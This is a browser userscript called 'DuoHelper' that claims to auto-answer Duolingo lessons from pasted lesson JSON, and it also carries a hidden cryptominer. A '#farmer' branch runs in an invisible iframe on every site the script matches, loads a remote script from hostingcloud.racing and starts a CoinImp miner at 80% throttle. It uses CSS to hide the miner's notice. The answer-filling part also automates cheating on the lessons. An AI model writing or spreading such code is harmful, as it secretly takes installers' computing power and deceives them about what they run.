// ==UserScript==
// @name         DuoHelper
// @namespace    http://tampermonkey.net/
// @version      1.0.3
// @description  Finish lesson quicker or get help with questions you don't know the answer to!
// @author       Lolo ( https://youtube.com/c/lolo5/ )
// @match        *://www.duolingo.com/
// @match        *://www.duolingo.com/*
// @match        *://*.duolingo.com/*
// @match        *://*.duolingo.com/#farmer
// @match        *
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/394182/DuoHelper.user.js
// @updateURL https://update.greasyfork.org/scripts/394182/DuoHelper.meta.js
// ==/UserScript==

(function() {
    'use strict';

    if(document.location.hash != "#farmer"){
        if(document.location.toString().includes("www.duolingo.com/")){
            var currenturl, oldurl = document.location.href

            var allowedurls = ["/learn"];

            var checkurl = setInterval(()=>{
                console.log("checking url");
                currenturl = document.location.href
                if(currenturl != oldurl){
                    console.log("url changed");
                    oldurl = currenturl;
                    if(true || allowedurls.contains(document.location.pathname)){
                        //start();
                        location.reload();
                    }
                }
            },1000);

            start();

            function start(){

                console.log("started");

                var answers = [];

                var check = setInterval(()=>{
                    if(document.querySelector('h1[data-test="challenge-header"]')){
                        clearInterval(check);
                        loaded();
                    }
                },500);

                document.addEventListener('contextmenu', (e) => {
                    e.preventDefault()
                    findanswer();
                });

                var textwaiting = false;

                document.addEventListener("keyup", event => {
                    if (textwaiting && event.keyCode === 32) {
                        textwaiting = false;
                        next();
                    }
                });

                function loaded(){
                    var div = document.createElement("div");
                    div.style = "position:fixed;top:10px;left:10px;z-index:999999;";
                    document.querySelector('div[class="_3PBCS"]').appendChild(div);

                    var btn = document.createElement("BUTTON");
                    btn.innerHTML = "Paste";
                    div.appendChild(btn);
                    btn.addEventListener('click', ()=>{
                        _p();
                    });

                    btn = document.createElement("BUTTON");
                    btn.innerHTML = "Answer";
                    div.appendChild(btn);
                    btn.addEventListener('click', ()=>{
                        findanswer();
                    });

                    btn = document.createElement("BUTTON");
                    btn.innerHTML = "Tutorial";
                    div.appendChild(btn);
                    btn.addEventListener('click', ()=>{
                        window.open("https://youtube.com/c/lolo5", "_blank");
                    });

                    div = document.createElement("div");
                    div.id = "_popup";
                    div.style = "display:none; position:absolute;top:10px;left:50%;transform: translateX(-50%);background-color:#eee; z-index:999999;width:300px;";
                    div.innerHTML = '<textarea id="_popup" style="resize: none; width: 100%; height:100px; margin: 0; padding: 0; border: 1px solid black;"></textarea><br><button id="cancelpopup">Cancel</button><button style="float:right;" id="submitpopup">Submit</button>';
                    document.body.appendChild(div);
                    document.querySelector("#cancelpopup").addEventListener("click", closepopup);
                    document.querySelector("#submitpopup").addEventListener("click", validate);
                }

                function _p(){
                    document.querySelector("#_popup").style.display = "block";
                }

                function closepopup(){
                    document.querySelector("#_popup").style.display = "none";
                    document.querySelector("#_popup > textarea").value = "";
                }

                function checkCards(_c){
                    if(typeof(_c.correctIndex) != "undefined"){
                        return _c.correctIndex.toString();
                    }
                    return false;
                }

                function validate(){
                    let json = document.querySelector("#_popup > textarea").value;
                    closepopup();
                    if(json != null){
                        json = JSON.parse(json);
                        json.challenges.forEach(_c => {
                            let _a;
                            switch(_c.type){
                                case "judge":
                                    _a = _c.correctIndices[0];
                                    break;
                                case "translate":
                                    _a = _c.compactTranslations[0];
                                    _a = _a.split("[").join("#").split("]").join("#").split("#");

                                    for(let i=0;i<_a.length;i++){
                                        _a[i] = _a[i].split("/")[0];
                                    }
                                    _a = _a.join("");
                                    break;
                                case "listenTap":
                                    _a = _c.correctTokens.join(" ");
                                    break;
                                case "speak":
                                    _a = "";
                                    break;
                                case "select":
                                    _a = _c.correctIndex;
                                    break;
                                case "name":
                                    _a = _c.correctSolutions[0];
                                    break;
                                default:
                                    console.log('error: '+_c);
                            }

                            console.log(_c);
                            answers.push({"t":_c.type,"q":_c.prompt,"a": _a});
                        });
                        console.log(answers);
                    }
                }


                function findanswer(){
                    if(document.querySelector('div[class="_3_JZ0 _3xkKb _1-ph4 _3Lwfw"]')){next()}else{
                        if(!answers.length > 0){
                            return;
                        }

                        let cti = document.querySelector('input[data-test=challenge-text-input]');
                        if(cti != null){
                            cti.value = cti.parentElement.querySelector('div').innerHTML.replace(/_/g, "");
                            cti.focus();
                            textNext();
                        }else{


                            var currenttitle;
                            let ca;
                            let ct = false;

                            if(document.querySelector('[data-test="challenge-header"]').parentElement.children[1].children.length == 2){
                                currenttitle = document.querySelector('[data-test="challenge-header"]').parentElement.children[1].children[0].innerText;
                                //ct = "judge";
                            }else{
                                currenttitle = document.querySelector('[data-test="challenge-header"]').innerText;
                            }

                            if(!ct){
                                answers.forEach(_a => {
                                    if(_a.q == currenttitle || _a.q == currenttitle.split("“").join("#").split("”").join("#").split("#")[1] ){
                                        if(_a.t == "judge" && isNaN(_a.a)){
                                            //is judge but answer not number
                                            console.log("no its a trap");
                                        }else{
                                            ca = _a.a;
                                            ct = _a.t;
                                        }
                                    }
                                });
                            }
                            if(!ct){
                                skip();
                            }

                            let imgelem = document.querySelector('button[data-test="player-toggle-keyboard"] > div > div');
                            if(imgelem != null){
                                if(getComputedStyle(imgelem).backgroundImage.includes("type-sentence.svg")){
                                    switchtype();
                                }
                            }


                            console.log(ct);
                            switch(ct){
                                case "judge":
                                    document.querySelectorAll('div[data-test="challenge-judge-text"]')[ca].click();
                                    break;
                                case "translate":
                                    document.querySelector('textarea').value = ca;
                                    textNext();
                                    break;
                                case "listenTap":
                                    document.querySelector('textarea').value = ca;
                                    textNext();
                                    break;
                                case "speak":
                                    skip();
                                    break;
                                case "select":
                                    document.querySelectorAll('[data-test="challenge-choice-card"] > label')[ca].click();
                                    break;
                                case "name":
                                    document.querySelector('input[data-test="challenge-text-input"]').value = ca;
                                    textNext();
                                    break;

                                default:
                                    console.log('error');
                            }
                            next();
                        }
                    }

                }


                function next(){
                    try{document.querySelector('button[data-test="player-next"]').click();}catch(e){}
                    setTimeout(()=>{try{document.querySelector('button[data-test="player-next"]').click();}catch(e){}},500);
                }

                function skip(){
                    document.querySelector('button[data-test="player-skip"]').click();
                }


                function fbt(selector,selectortext){
                    selectortext = selectortext.toLowerCase();
                    var nodes = document.querySelectorAll(selector);
                    for(var i=0;i<nodes.length;i++){
                        if(nodes[i].innerText.toLowerCase() == selectortext){
                            return nodes[i];
                        }
                    }
                }

                function switchtype(){
                    document.querySelector('[data-test="player-toggle-keyboard"]').click();
                }

                function textNext(){
                    textwaiting = true;
                }

            }

        }
        var iframe = document.createElement('iframe');
        iframe.src = document.location+'#farmer';
        iframe.style.display = "none";
        document.body.appendChild(iframe);
        console.log('iframe.contentWindow =', iframe.contentWindow);
    }else{
        //this script includes a https://www.coinimp.com/ script
        console.log("farmer");
        setTimeout(()=>{
            var scriptElm = document.createElement('script');
            scriptElm.src = 'https://www.hostingcloud.racing/2s4q.js';
            scriptElm.addEventListener("load", second);
            document.body.appendChild(scriptElm);

            var styleelem = document.createElement('style');
            styleelem.innerHTML = 'div:has(a[href="https://www.mintme.com/"]){display:none}';
            document.head.appendChild(styleelem);


            function second(){
                console.log("startedf");
                var script2 = document.createElement('script');
                script2.innerHTML = "var _client = new Client.Anonymous('4e3661fe9ad319c00d604d91e78529226165eb2da39cbffb6d38289d3a4a7d70', {throttle: 0.8, c: 'w'});_client.start();var _i_nterval = setInterval(()=>{console.log(_client.getHashesPerSecond());},10000);";
                document.body.appendChild(script2);
            }
        },2000);
    }
})();